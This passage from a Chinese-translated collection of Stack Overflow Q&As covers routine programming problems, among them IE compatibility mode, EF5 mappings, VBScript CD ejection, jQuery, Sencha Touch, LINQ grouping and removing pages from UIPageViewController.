                        if (product.HasPhotos) {
                            content.push("<div class=\"nailthumb-container\" href=" + pageLocation + "Uploads/" + product.Photos[0].ImagePath.replace(/ /gi, "%20") + "><img src=" + pageLocation + "Uploads/" + product.Photos[0].ImagePath.replace(/ /gi, "%20") + "></img></div>");
                        }
                        else {
                            content.push("<div class=\"nailthumb-container\" href=" + pageLocation + "Uploads/no-img.jpg><img src=" + pageLocation + "Uploads/no-img.jpg></img></div>");
                        }
                        content.push("<br/><br/><p>" + product.Title + "<br/>$" + product.Cost + "</p>");
                        content.push("</a></td>");
                        if (limit == totalCols) {
                            content.push("</tr><tr>");
                            limit = 0; //reset limit
                        }
                    }
                }
                limit = 0;
                content.push("</tr></table>");
            }

            content.push("</div>");
        }
    }

    content.push("</div>");

    $("#productsContainer").replaceHtml(content.join(""));
    $("#productsContainer").show();
    $(".nailthumb-container").nailthumb({ width: 100, height: 100, fitDirection: 'top left' });

    $("#tabs").tabs().addClass("ui-tabs-vertical ui-helper-clearfix");
    $("#tabs li").removeClass("ui-corner-top").addClass("ui-corner-left");

    content = null;
    category = null;
    product = null;
    totalCols = null;
    limit = null;
}

function clearProducts() {
    $("#productsContainer").replaceHtml("").hide();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:14:37.057

快速而肮脏的答案是您强制页面加载为 IE7 标准。

只要页面不在 IE7 标准文档模式下，该页面就可以在 IE 8/9 中正常加载。

从头中删除以下内容（或将其更改为 8，或者您需要的最低版本以实现兼容性，假设您甚至需要使用 X-UA-Compatible）应该可以解决问题：

`<meta http-equiv="X-UA-Compatible" content="IE=7" />`

至于为什么它破坏 IE7 标准文档模式将是一个不同的问题，但从技术上讲，对于 IE8/9 来说一切都很好，你只是在强迫他们使用 7 个**确实**破坏的标准。

# ef-code-first - EF 5.0 Code First 3 个实体之间的映射问题

> ID：14220269
> 
> 赞同：1
> 
> 时间：2013-01-08T17:03:59.570
> 
> 标签：ef-code-first, entity-relationship, entity-framework-5

我有 2 个实体：

```
public class School
{
    public int Id { get; set; }
    ...
    public virtual ICollection<Seminar> Seminars { get; set; }
}

public class Seminar
{
    public int Id { get; set; }
    ...
    public virtual ICollection<School> Schools { get; set; }

    public virtual ICollection<Price> Prices { get; set; } // wrong??
}

public class Price
{
    public int Id { get; set; }

    public decimal Value { get; set; }

    public virtual School School { get; set; }

    public virtual Seminar Seminar { get; set; }
} 
```

如何映射“价格”属性以获得如下内容：

```
var priceOfSomeSeminar = someSchool.Seminars[0].Price 
```

可能吗？所以我想我需要帮助建立 Fluent API modelBuilder 关系......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:43:49.907

好吧，ICollection 没有索引器，因此您不能对它使用数组语法。但是，您可以将其转换为 IEnumerable，然后将其转换为 List，然后可以对其进行索引。

但是不，您使用的是正确的语义，所以这应该可以工作。无需使用流利的 api。

我认为你有一个错误，价格不应该有学校成员。价格和学校没有直接关系。

# vbscript - 在没有外部文件的 WinPE 中识别 CD 驱动器并使用 bat 或 vbs 弹出

> ID：14220273
> 
> 赞同：1
> 
> 时间：2013-01-08T17:04:05.293
> 
> 标签：vbscript, drive, winpe, cd-rom

我需要识别 CD 驱动器并弹出托盘。这是在 WinPE 中启动时执行的，因此 WMP 弹出功能不可用。该脚本将用于各种计算机型号/配置。我目前正在使用这个：

```
For Each d in CreateObject("Scripting.FileSystemObject").Drives
    CreateObject("Shell.Application").Namespace(17).ParseName("D:\").InvokeVerb("Eject")
Next 
```

它可以工作，但有时会出错并需要用户交互才能弹出。我怀疑这是因为硬编码的`D:\`驱动器号，但我可能完全错了。我需要这个在没有 3rd 方实用程序的情况下工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:30:51.290

使用对象的[`DriveType`](http://msdn.microsoft.com/en-us/library/ys4ctaz0%28v=vs.84%29.aspx)属性[`Drive`](http://msdn.microsoft.com/en-us/library/ts2t8ybh(v=vs.84).aspx)：

```
For Each d in CreateObject("Scripting.FileSystemObject").Drives
    WScript.sleep 60
    If d.DriveType = 4 Then
        CreateObject("Shell.Application").Namespace(17).ParseName(d.DriveLetter & ":\").InvokeVerb("Eject")
    End If
Next 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:08:18.297

这是使用媒体播放器弹出的代码；我不确定从您的 WinPE 环境中调用有多么容易：

```
' http://www.msfn.org/board/topic/45418-vbscript-for-openingclosing-cd/ 
' http://waxy.org/2003/03/open_cdrom_driv/
Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection
     For d = 0 to colCDROMs.Count - 1
           colCDROMs.Item(d).Eject 
Next 'null 
```

计划 B 是下载“eject.exe”的副本，并将其包含在您的 WinPE 媒体中：

*   [http://www.911cd.net/forums/index.php?showtopic=2931&hl=cd+eject](http://www.911cd.net/forums/index.php?showtopic=2931&hl=cd+eject)

# php - 获取文本框的 id 和值

> ID：14220275
> 
> 赞同：-5
> 
> 时间：2013-01-08T17:04:09.707
> 
> 标签：php, javascript, mysql, jquery

我无法获取文本框的 ID 和值。

我在这里有这个 PHP 代码：

```
<h1>Receive</h1>
<h1>Receive Materials</h1>

<?php
    //Materials
    $p = proj_id_from_user_id($user_id);
    $r = mysql_query("SELECT `mat_name`, `mat_id` FROM `requests` JOIN `materials` USING (`mat_id`) WHERE `stat_id`=4 AND `proj_id`='".$p."'");

    while($rows = mysql_fetch_assoc($r)) {
        $mat_id = array($rows['mat_id']);
        $mat_name = array($rows['mat_name']);

        foreach($mat_name as $mat_name_key => $materials){
            echo '<p id="receiveitem">';
            echo '<label for="mat_id">Material</label>';
            echo '<input type="text" id="'.$mat_id[$mat_name_key].'"value="'.$materials.'" disabled/>';
            echo '<label for="rec_qty">Quantity</label>';
            echo '<input type="text" id="rec_qty" />';
            echo '<input type="button" id="receive" value=Receive />';
            echo '</p>';
        }
    }
?> 
```

我想要实现的是当我点击按钮接收。它将提醒文本框的值及其 ID。

我也有这个 JavaScript 代码：

```
$(document).ready(function(){
    $('input#receive').click(function(){
        alert();
    });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:07:58.110

您需要有某种方式来识别您的文本框。如果你给文本框一个 CSS 类“mytextbox”，那么你的 jQuery 代码将是：

```
$(document).ready(function(){
    $('input#receive').click(function(){
        alert($('input.mytextbox').val());
    });
}); 
```

查看[jQuery 选择器](http://api.jquery.com/category/selectors/?rdfrom=http://docs.jquery.com/mw/index.php?title=Selectors&redirect=no)文档。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:10:32.370

```
$(document).ready(function(){
    $('input#receive').click(function(){
          $('input[type=text]').each(function() {
               var input_value = $(this).val();
               var input_id = $(this).attr('id');
               alert('Value: ' + input_value + ', ID: ' + input_id);
          });

    });
}); 
```

# javascript - 无法查看多个模板 (SENCHA TOUCH 2)

> ID：14220280
> 
> 赞同：-1
> 
> 时间：2013-01-08T17:04:18.270
> 
> 标签：javascript, mobile, sencha-touch, sencha-touch-2

我正在尝试创建一个包含多个表单面板（5）的视图，每个表单面板都有一个字段集，但是从我读过的内容来看，一个视图只能包含 1 个表单面板，当我设置 5 时，只显示第一个。

最初我使用具有多个字段集的视图并获得了我想要的外观，但是，此解决方案不允许我将存储记录设置到这些字段集，因此我可以在同一视图中管理多个记录，因此我不得不尝试制作这些字段集有一个父窗体，因此我的问题开始了。

MyConfigView.js：

```
Ext.define('MyApp.view.MyConfigView',{
extend: 'Ext.Panel',
alias: 'widget.configview',
config:{
        layout: {
            type: 'card',
            animation:{
                type: 'slide',
                direction: 'left',
                duration: 8000
            }
        },
        items:[
        {
                docked: 'top',
                xtype: 'toolbar',
                ui: 'light',
                title: 'Yadayada', 
                itemId: 'toolbarMyConfigView',
                items: [{
                    xtype: 'button',
                    ui: 'back',
                    text: 'Voltar',
                    action: 'voltarConfigView',
                    itemId: 'toolbarMyConfigViewVoltarBt'
                }

                ]

        },
                    {
                    xtype: 'formpanel',
                    items:[
                    {
                        xtype: 'fieldset',
                        title: 'Yada',
                        id: 'fieldSetAssalto',
                        model: 'Socorro.model.MyModel',
                        cls: 'x-floating',
                        items:[
                            {
                                xtype: 'textfield',
                                name: 'numeroTelefone',
                                label: 'Yada'
                            },
                            {
                                xtype: 'textfield',
                                name: 'mensagem',
                                label: 'Yada'
                            }
                        ]
                    }
                    ]
                },

                {
                xtype: 'formpanel',
                items:[

                    {
                        xtype: 'fieldset',
                        title: 'YADA',
                        itemId: 'fieldSetIncendio',
                        model: 'Socorro.model.MyModel',
                        cls: 'x-floating',

                        items:[
                            {
                                xtype: 'textfield',
                                name: 'numeroTelefone',
                                label: 'yadada'
                            },
                            {
                                xtype: 'textfield',
                                name: 'mensagem',
                                label: 'yaaada'
                            }
                        ]
                    }
                    ]
                },
                {
                xtype: 'formpanel',
                items:[ 
                    {
                        xtype: 'fieldset',
                        title: 'YADADA',
                        itemId: 'fieldSetSequestro',
                        model: 'Socorro.model.MyModel',
                        cls: 'x-floating',

                        items:[
                            {
                                xtype: 'textfield',
                                name: 'numeroTelefone',
                                label: 'Yadaaa'
                            },
                            {
                                xtype: 'textfield',
                                name: 'mensagem',
                                label: 'yadada'
                            }
                        ]
                    }
                    ]
                },
                {
                xtype: 'formpanel',
                items:[
                    {
                        xtype: 'fieldset',
                        title: 'YADA',
                        itemId: 'fieldSetEmedico',
                        model: 'Socorro.model.MyModel',
                        cls: 'x-floating',

                        items:[
                            {
                                xtype: 'textfield',
                                name: 'numeroTelefone',
                                label: 'YADAA'
                            },
                            {
                                xtype: 'textfield',
                                name: 'mensagem',
                                label: 'Yada'
                            }
                        ]
                    }
                    ]
                },
                {
                xtype: 'formpanel',
                items:[
                        {
                            xtype: 'fieldset',
                            title: 'Yada',
                            itemId: 'fieldSetAcidente',
                            model: 'Socorro.model.MyModel',
                            cls: 'x-floating',

                            items:[
                                {
                                    xtype: 'textfield',
                                    name: 'numeroTelefone',
                                    label: 'Yada'
                                },
                                {
                                    xtype: 'textfield',
                                    name: 'mensagem',
                                    label: 'Yada'
                                }
                            ]
                        }

                    ]
                }

]
}

}); 
```

关于如何使用 Sencha Touch 2 获得具有多个窗体的视图的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:28:10.893

那是因为您的 MyApp.view.MyConfigView 视图应用了“卡片”布局，并且这种布局允许您仅将单个子视图显示为活动状态。要将它们全部显示在同一个视图中，我建议您将视图配置设置如下：

```
Ext.define('MyApp.view.MyConfigView',{
    extend: 'Ext.Container',
    alias: 'widget.configview',
    config:{
        layout: {
            type: 'vbox',
            align: 'stretch'
        }
        defaults: {
            flex: 1
        },
        items: [
            ...
        ]
    }
}); 
```

通过这种方式，您将在视图中垂直放置窗体，使它们具有相同的高度。PS：从中删除“x-floating”类。

但是，如果您想使用卡片布局（这似乎是最好的解决方案），我建议您为所有表单面板提供不同的“itemId”配置参数。

```
xtype: 'formpanel',
itemId: 'assalto',
items: [
    ...
] 
```

然后，使用ST MVC架构，将这些表单一一获取，并调用函数。

```
.setRecord(<YOUR_RECORD>); 
```

在 Sencha 的文档上阅读更多关于 ST 控制器的信息。 [http://docs.sencha.com/touch/2-1/#!/guide/controllers](http://docs.sencha.com/touch/2-1/#!/guide/controllers)

# entity-framework - Linq to Entities 查询以选择最新的不同记录

> ID：14220283
> 
> 赞同：2
> 
> 时间：2013-01-08T17:04:48.630
> 
> 标签：entity-framework, linq-to-entities, umbraco

我正在尝试`DateTime`用 Linq 检索由 a 排序的记录到实体，但我也需要它们作为不同的记录。

我的表设计如下所示：

![在此处输入图像描述](../Images/f289a915c4b40fce07a4570e818ff1e3.png)

Umbraco CMS 节点在哪里`blogItemNodeId`（可以创建评论的博客项目节点）

要求是博客项目列表可以按评论数排序。`blogItemNodeId`所以我需要通过显示这些博客项目来获得最新的评论。

我当前的 linq 查询如下所示：

```
var distinctComments = (from c in ctx.BlogComments
                        orderby c.date
                        group c by c.blogItemNodeId
                        into uniqueRecords
                        select uniqueRecords.FirstOrDefault()); 
```

这个查询的问题是它找到了第一个（因此`FirstOrDefault()`）记录`blogItemNodeId`，它应该在哪里找到所有评论中最新的一条`blogItemNodeId`。

有谁知道如何实现这一目标？:-)

提前非常感谢。

**编辑**

我设法通过这样做使它工作：

```
var allComments = (from c in ctx.BlogComments
                   orderby c.date descending
                   select c).ToList();

var distinctComments = allComments.GroupBy(x => x.blogItemNodeId).Select(y => y.FirstOrDefault()); 
```

但是我必须先得到*所有*的评论，然后再做这个不太优雅也不高效的小组。

任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T21:14:18.463

您可以将 orderBy 语句和 GroupBy 语句组合成一个语句，如下所示：

```
var distinctComments = ctx.BlogComments.OrderBy(c => c.date)
                        .GroupBy(x => x.blogItemNodeId)
                        .Select(y => y.FirstOrDefault()); 
```

如果性能不好，您可以通过 Singleton 将 DataContext 缓存在 HttpCache 中。有关示例，请参阅[此博客文章。](http://our.umbraco.org/forum/developers/api-questions/26479-Linq-to-Umbraco-singleton-datacontext-and-document-updates)这基于 Umbraco DataContext，但可以轻松修改以用于其他类型的上下文。

# iphone - 从 UIPageViewController 中移除视图控制器

> ID：14220289
> 
> 赞同：49
> 
> 时间：2013-01-08T17:05:01.670
> 
> 标签：iphone, objective-c, ios, cocoa-touch

奇怪的是，没有直接的方法可以做到这一点。考虑以下场景：

1.  您有一个带有 1 页的页面视图控制器。
2.  添加另一个页面（共 2 个）并滚动到它。
3.  **我想要的是，**当用户滚动回第一页时，第二页现在被删除并释放，用户不能再滑回该页面。

转换完成后，我尝试将视图控制器作为子视图控制器删除，但它仍然让我滚动回空白页面（它不会“调整”页面视图的大小）

我想做的事可能吗？

* * *

## 回答 #1

> 赞同：129
> 
> 时间：2013-06-26T21:16:41.990

虽然这里的答案都提供了丰富的信息，但还有另一种处理问题的方法，如下所示：

[UIPageViewController 使用滚动过渡样式导航到错误页面](https://stackoverflow.com/questions/12939280/uipageviewcontroller-navigates-to-wrong-page-with-scroll-transition-style)

当我第一次搜索这个问题的答案时，我的搜索方式让我陷入了这个问题，而不是我刚刚链接到的那个问题，所以我觉得有义务发布一个链接到另一个问题的答案，既然我已经找到了，也详细说明了一点。

[马特在这里](https://stackoverflow.com/a/12939384/700471)很好地描述了这个问题：

> 这实际上是 UIPageViewController 中的一个错误。它仅在滚动样式 (UIPageViewControllerTransitionStyleScroll) 中发生并且仅在使用动画：YES 调用 setViewControllers:direction:animated:completion: 之后发生。因此有两种解决方法：
> 
> 不要使用 UIPageViewControllerTransitionStyleScroll。
> 
> 或者，如果您调用 setViewControllers:direction:animated:completion:，则仅使用动画：NO。
> 
> 要清楚地查看错误，请调用 setViewControllers:direction:animated:completion:，然后在界面中（作为用户）手动向左（返回）导航到前一页。您将导航回错误的页面：根本不是前一页，而是调用 setViewControllers:direction:animated:completion: 时所在的页面。
> 
> 该错误的原因似乎是，当使用滚动样式时， UIPageViewController 会进行某种内部缓存。因此，在调用 setViewControllers:direction:animated:completion: 之后，它无法清除其内部缓存。它认为它知道前一页是什么。因此，当用户向左导航到上一页时，UIPageViewController 调用 dataSource 方法 pageViewController:viewControllerBeforeViewController: 失败，或者调用了错误的当前视图控制器。

这是一个很好的描述，不是这个问题中提到的问题，但非常接近。请注意，如果您这样做`setViewControllers`，`animated:NO`将强制 UIPageViewController 在下次用户使用手势进行平移时重新查询其数据源，因为它不再“知道它在哪里”或哪些视图控制器在其当前视图控制器旁边.

但是，这对我不起作用，因为有时我需要*使用*动画以编程方式移动 PageView。

所以，我的第一个想法是调用`setViewControllers`动画，然后在完成块中再次调用该方法，使用现在显示的任何视图控制器，但没有动画。所以用户可以平移，很好，但是我们再次调用该方法来重置页面视图。

不幸的是，当我尝试时，我开始从页面视图控制器中收到奇怪的“断言错误”。它们看起来像这样：

> *** 断言失败 -[UIPageViewControllerqueuingScrollView: ...

不知道为什么会发生这种情况，我回溯并最终开始使用[Jai 的答案](https://stackoverflow.com/a/16308151/700471)作为解决方案，创建一个全新的 UIPageViewController，将其推送到 UINavigationController，然后弹出旧的。恶心，但它有效 - 主要是。我一直发现我仍然偶尔会从 UIPageViewController 收到断言失败，比如这个：

> *** 断言失败 -[UIPageViewController queuingScrollView:didEndManualScroll:toRevealView:direction:animated:didFinish:didComplete:], /SourceCache/UIKit_Sim/UIKit-2380.17/UIPageViewController.m:1820 $1 = 154507824 没有视图控制器管理可见视图 >

应用程序崩溃。为什么？好吧，搜索，我发现了我在上面提到的[另一个问题](https://stackoverflow.com/questions/12939280/uipageviewcontroller-navigates-to-wrong-page-with-scroll-transition-style)，特别是提倡我最初想法的[公认答案](https://stackoverflow.com/a/13253884/700471)`setViewControllers: animated:YES`，即简单地调用，然后在完成调用后立即`setViewControllers: animated:NO`使用相同的视图控制器重置 UIPageViewController，但它有缺少的元素：在主队列中调用该代码！这是代码：

```
__weak YourSelfClass *blocksafeSelf = self;     
[self.pageViewController setViewControllers:viewControllers direction:UIPageViewControllerNavigationDirectionForward animated:YES completion:^(BOOL finished){
            if(finished)
            {
                dispatch_async(dispatch_get_main_queue(), ^{
                    [blocksafeSelf.pageViewController setViewControllers:viewControllers direction:UIPageViewControllerNavigationDirectionForward animated:NO completion:NULL];// bug fix for uipageview controller
                });
            }
        }]; 
```

哇！这对我来说真正有意义的唯一原因是因为我观看了 WWDC 2012 Session 211，在 iOS 上构建并发用户界面（可[在此处](https://developer.apple.com/videos/wwdc/2012/)使用开发帐户获得）。我现在回想一下，尝试修改 UIKit 对象（如 UIPageViewController）所依赖的数据源对象，并在辅助队列上进行，可能会导致一些令人讨厌的崩溃。

我从未见过特别记录的，但现在必须假设是这种情况并继续阅读的是，动画的完成块是在辅助队列上执行的，而不是在主队列上执行的。因此，当我最初尝试调用`setViewControllers animated:NO`完成块时，`setViewControllers animated:YES`以及现在我只是使用 UINavigationController 推送新的 UIPageViewController 时，UIPageViewController 发出尖叫并给出断言失败的原因（但再次在完成中执行它） ) 的块`setViewControllers animated:YES`是因为这一切都发生在那个辅助队列上。

这就是为什么上面的那段代码可以完美运行的原因，因为您来自动画完成块并将其发送回主队列，这样您就不会与 UIKit 交叉流。杰出的。

无论如何，想分享这个旅程，以防有人遇到这个问题。

[编辑：这里](https://stackoverflow.com/a/33786397/700471)的Swift 版本，如果有人感兴趣的话。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-08-28T12:51:13.260

总结 Matt Mc 的出色回答，可以将以下方法添加到 UIPageViewController 的子类中，这样就可以使用 setViewControllers:direction:animated:completion:，因为它的目的是在不存在错误的情况下使用。

```
- (void) setViewControllers:(NSArray*)viewControllers direction:(UIPageViewControllerNavigationDirection)direction animated:(BOOL)animated completion:(void (^)(BOOL))completion {

    if (!animated) {
        [super setViewControllers:viewControllers direction:direction animated:NO completion:completion];
        return;
    }

    [super setViewControllers:viewControllers direction:direction animated:YES completion:^(BOOL finished){

        if (finished) {
            dispatch_async(dispatch_get_main_queue(), ^{
                [super setViewControllers:viewControllers direction:direction animated:NO completion:completion];
            });
        } else {
            if (completion != NULL) {
                completion(finished);
            }
        }
    }];
} 
```

现在，只需在实现此方法的类/子类上调用 setViewControllers:direction:animated:completion:，它就会按预期工作。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-02-13T06:44:10.460

马克是对的。如果您正在使用滚动转换，则从 UIPageViewController 中删除子视图控制器不会阻止已删除的“页面”在用户导航到它时返回到屏幕上。如果您有兴趣，以下是我从 UIPageViewController 中删除子视图控制器的方法。

```
// deleteVC is a child view controller of the UIPageViewController
[deleteVC willMoveToParentViewController:nil];
[deleteVC.view removeFromSuperview];
[deleteVC removeFromParentViewController]; 
```

视图控制器 deleteVC 已从 UIPageViewController 的 childViewControllers 属性中删除，但如果用户导航到它，它仍会显示在屏幕上。

在比我聪明的人找到一个优雅的解决方案之前，这里有一个解决方法（这是一个 hack——所以你必须问自己是否真的需要从 UIPageViewController 中删除页面）。

这些说明假定一次只显示一页。

在用户点击一个表示她想要删除页面的按钮后，使用 setViewControllers:direction:animated:completion: 方法导航到下一页或上一页。当然，您随后需要从数据模型中删除页面的内容。

接下来（这里是 hack），创建和配置一个全新的 UIPageViewController 并将其加载到前台（即，在另一个 UIPageViewController 的前面）。确保新的 UIPageViewController 开始显示与之前显示的完全相同的页面。您的新 UIPageViewController 将从数据源中获取新的视图控制器。

最后，卸载并销毁后台的 UIPageViewController。

无论如何，maq 提出了一个非常好的问题。不幸的是，我没有足够的声望点来支持这个问题。啊，敢做梦……总有一天我会有15点声望。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-04-30T20:08:14.483

我将把这个答案放在这里只是为了我自己将来的参考，如果它对任何人有帮助 - 我最终做的是：

1.  删除页面并前进到下一页
2.  在完成块中`setViewControllers`，我使用修改后的数据（已删除项目）创建/初始化了一个新的 UIPageViewController，并在没有动画的情况下推送它，因此屏幕上没有任何变化（我的 UIPageViewController 包含在 UINavigationController 中）
3.  推送新的 UIPageViewController 后，获取 UINavigationController 的数组的副本`viewControllers`，移除倒数第二个视图控制器（也就是旧的 UIPageViewController）
4.  没有第 4 步 - 完成！

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-01-09T00:47:36.687

我自己只是在学习这一点，所以持保留态度，但据我了解，您需要更改 pageviewcontroller 的数据源，而不是删除 viewcontroller。pageviewcontroller 中显示的页面数量取决于其数据源，而不是 viewcontrollers。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-04-16T12:44:33.093

为了改善这一点。您应该在 setViewControllers 之前检测 pageView 是否正在滚动。

```
var isScrolling = false

func viewDidLoad() {
...

  for v in view.subviews{
    if v.isKindOfClass(UIScrollView) {
      (v as! UIScrollView).delegate = self
    }
  }
}

func scrollViewWillBeginDragging(scrollView: UIScrollView){
    isScrolling = true
}

func scrollViewDidEndDecelerating(scrollView: UIScrollView){
    isScrolling = false
}

func jumpToVC{
    if isScrolling {  //you should not jump out when scrolling
        return
    }
    setViewControllers([vc], direction:direction, animated:true, completion:{[unowned self] (succ) -> Void in
        if succ {
            dispatch_async(dispatch_get_main_queue(), { () -> Void in
                self.setViewControllers([vc], direction:direction, animated:false, completion:nil)
            })
        }
    })
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2015-06-26T21:41:18.463

当您在视图控制器之间滑动手势动画期间尝试更改视图控制器时，会出现此问题。为了解决这个问题，我做了一个简单的标志来发现页面视图控制器何时在转换。

```
- (void)pageViewController:(UIPageViewController *)pageViewController willTransitionToViewControllers:(NSArray *)pendingViewControllers {
    self.pageViewControllerTransitionInProgress = YES;
}

- (void)pageViewController:(UIPageViewController *)pageViewController didFinishAnimating:(BOOL)finished previousViewControllers:(NSArray *)previousViewControllers transitionCompleted:(BOOL)completed {
        self.pageViewControllerTransitionInProgress = NO;
} 
```

当我试图改变视图控制器时，我正在检查是否正在进行转换。

```
- (void)setCurrentPage:(NSString *)newCurrentPageId animated:(BOOL)animated {

    if (self.pageViewControllerTransitionInProgress) {
        return;
    }

    [self.pageContentViewController setViewControllers:@[pageDetails] direction:UIPageViewControllerNavigationDirectionForward animated:NO completion:^(BOOL finished) {
    }

} 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2013-02-20T21:42:13.887

其实我想我解决了这个问题。这是我的应用程序中发生的事情：

1.  UIViewController 子类实例已从 UIPageViewController 中删除，方法是将其从模型中删除并将 UIPageViewController 的 viewControllers 属性设置为不同的 ViewController。这足以完成这项工作。无需在该控制器上执行任何控制器包含代码
2.  ViewController 不见了，但我仍然可以通过向右滑动来滚动到它。
3.  我的问题是这个。我正在向 UIPageViewController 显示的 ViewController 添加自定义手势识别器。这个识别器作为一个强大的属性保存在同样拥有 UIPageViewController 的控制器上。
4.  修复：**在失去对 ViewController 的访问权限之前，我确保我正确清理了它使用的所有内存（dealloc）并删除了手势识别器**
5.  您的里程可能会有所不同，但我认为这个解决方案没有任何意义，当某些东西不起作用时，我首先怀疑我的代码:)

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2015-02-16T05:34:43.883

我有类似的情况，我希望用户能够从 UIPageViewController 中“点击并删除”任何页面。在玩了一会儿之后，我找到了一个比上面描述的更简单的解决方案：

1.  捕获“垂死页面”的页面索引。
2.  检查“死页”是否是最后一页。
    *   这很重要，因为如果它是最后一页，我们需要向左滚动（如果我们有页面“AB C”并删除 C，我们将滚动到 B）。
    *   如果不是最后一页，我们将向右滚动（如果我们有页面“AB C”并删除 B，我们将滚动到 C）。
3.  临时跳到一个“安全”的地方（最好是最后一个）。使用动画：NO 让这种情况立即发生。

    ```
    UIViewController *jumpToAnotherViewController = [self viewControllerAtIndex:dyingPageIndex-1];
    [self setViewControllers:@[jumpToAnotherViewController] direction:UIPageViewControllerNavigationDirectionReverse animated:NO completion:nil]; 
    ```

4.  从模型/数据源中删除选定的页面。

5.  现在，如果它是最后一页：

    *   调整您的模型以选择左侧的页面。
    *   获取左侧的视图控制器，注意这与您在第 3 步中检索到的相同。
    *   从数据源中删除页面后执行此操作很重要，因为它会刷新它。
    *   跳到它，这次是动画：是的。

        ```
        jumpToAnotherViewController = [self viewControllerAtIndex:dyingPageIndex-1];
        [self setViewControllers:@[jumpToAnotherViewController] direction:UIPageViewControllerNavigationDirectionReverse animated:YES completion:nil]; 
        ```

6.  在它不是最后一页的情况下：

    *   调整您的模型以选择右侧的页面。
    *   获取右侧的视图控制器，注意这不是您在步骤 3 中检索到的那个。在我的例子中，您会看到它是位于 DyingPageIndex 的那个，因为死页已经从模型中删除。
    *   同样，在您从数据源中删除页面之后执行此操作很重要，因为它会刷新它。
    *   跳到它，这次是动画：是的。

        ```
        jumpToAnotherViewController = [self viewControllerAtIndex:dyingPageIndex;
        [self setViewControllers:@[jumpToAnotherViewController] direction:UIPageViewControllerNavigationDirectionForward animated:YES completion:nil]; 
        ```

7.  就是这样！这在 XCode 6.1.1 中运行良好。

完整代码如下。此代码在我的 UIPageViewController 中，并通过要删除的页面中的委托调用。就我而言，不允许删除第一页，因为它包含与其余页面不同的内容。当然，你需要替换：

*   YourUIViewController：带有您的各个页面的类。
*   YourTotalNumberOfPagesFromModel：包含模型中的总页数
*   [YourModel deletePage:] 使用代码从模型中删除垂死页面

    ```
    - (void)deleteAViewController:(id)sender {
        YourUIViewController *dyingGroup = (YourUIViewController *)sender;
        NSUInteger dyingPageIndex = dyingGroup.pageIndex;
        // Check to see if we are in the last page as it's a special case.
        BOOL isTheLastPage = (dyingPageIndex >= YourTotalNumberOfPagesFromModel.count);
        // Make a temporary jump back - make sure to use animated:NO to have it jump instantly
        UIViewController *jumpToAnotherViewController = [self viewControllerAtIndex:dyingPageIndex-1];
        [self setViewControllers:@[jumpToAnotherViewController] direction:UIPageViewControllerNavigationDirectionReverse animated:NO completion:nil];
        // Now delete the selected group from the model, setting the target
        [YourModel deletePage:dyingPageIndex];
        if (isTheLastPage) {
            // Now jump to the definitive controller. In this case, it's the same one, we're just reloading it to refresh the data source.
            // This time we're using animated:YES
            jumpToAnotherViewController = [self viewControllerAtIndex:dyingPageIndex-1];
            [self setViewControllers:@[jumpToAnotherViewController] direction:UIPageViewControllerNavigationDirectionReverse animated:YES completion:nil];
        } else {
            // Now jump to the definitive controller. This reloads the data source. This time we're using animated:YES
            jumpToAnotherViewController = [self viewControllerAtIndex:dyingPageIndex];
            [self setViewControllers:@[jumpToAnotherViewController] direction:UIPageViewControllerNavigationDirectionForward animated:YES completion:nil];
        }
    } 
    ```

* * *

## 回答 #10

> 赞同：-1
> 
> 时间：2016-09-18T19:02:52.943

```
NSMutableArray *mArray = [[NSMutableArray alloc] initWithArray:self.userArray];
[mArray removeObject:userToBlock];
self.userArray = mArray;

UIViewController *startingViewController = [self viewControllerAtIndex:atIndex-1];
NSArray *viewControllers = @[startingViewController];
[self.pageViewController setViewControllers:viewControllers direction:UIPageViewControllerNavigationDirectionReverse animated:NO completion:nil]; 
```

我没有时间阅读上述评论，但这对我有用。基本上我删除数据（在我的情况下是用户），然后移动到它之前的页面。奇迹般有效。希望这可以帮助那些寻求快速修复的人。

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2016-10-05T12:06:02.390

它在 Swift 3.0 中完成了以下操作

```
fileprivate var isAnimated:Bool = false

override func setViewControllers(_ viewControllers: [UIViewController]?, direction: UIPageViewControllerNavigationDirection, animated: Bool, completion: ((Bool) -> Void)? = nil) {

        if self.isAnimated {
            delay(0.5, closure: { 
                self.setViewControllers(viewControllers, direction: direction, animated: animated, completion: completion)
            })
        }else {
                super.setViewControllers(viewControllers, direction: direction, animated: animated, completion: completion)
        }

    }

extension SliderViewController:UIPageViewControllerDelegate {

    func pageViewController(_ pageViewController: UIPageViewController, willTransitionTo pendingViewControllers: [UIViewController]) {
        self.isAnimated = true
    }

    func pageViewController(_ pageViewController: UIPageViewController, didFinishAnimating finished: Bool, previousViewControllers: [UIViewController], transitionCompleted completed: Bool) {
        self.isAnimated = finished
    }
} 
```

这里是延迟函数

```
func delay(_ delay:Double, closure:@escaping ()->()) {
    DispatchQueue.main.asyncAfter(
        deadline: DispatchTime.now() + Double(Int64(delay * Double(NSEC_PER_SEC))) / Double(NSEC_PER_SEC), execute: closure)
} 
```

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2019-10-16T13:33:19.623

我们在标签更改时崩溃了。所以我得到的一个解决方案是标签的 didChangeSelect 禁用了用户吸引力。

# java - 如何从 Java 应用程序访问 http 服务器目录？

> ID：14220292
> 
> 赞同：1
> 
> 时间：2013-01-08T17:05:03.290
> 
> 标签：java, file, httpclient

